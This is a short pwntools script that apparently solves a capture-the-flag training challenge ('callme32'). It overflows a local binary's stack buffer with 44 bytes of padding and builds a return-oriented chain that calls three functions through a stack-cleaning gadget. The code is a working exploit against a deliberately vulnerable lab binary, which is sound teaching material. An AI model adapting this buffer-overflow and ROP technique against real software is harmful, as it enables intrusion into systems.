from pwn import *

p = process("./callme32")
callme_one = 0x080485c0
callme_two = 0x08048620
callme_three = 0x080485b0
gadgets = 0x080488a9
args = p32(1)+p32(2)+p32(3)

payload = ''
payload += "A"*44
payload += p32(callme_one)
payload += p32(gadgets)
payload += args
payload += p32(callme_two)
payload += p32(gadgets)
payload += args
payload += p32(callme_three)
payload += p32(gadgets)
payload += args

p.sendline(payload)
p.interactive()
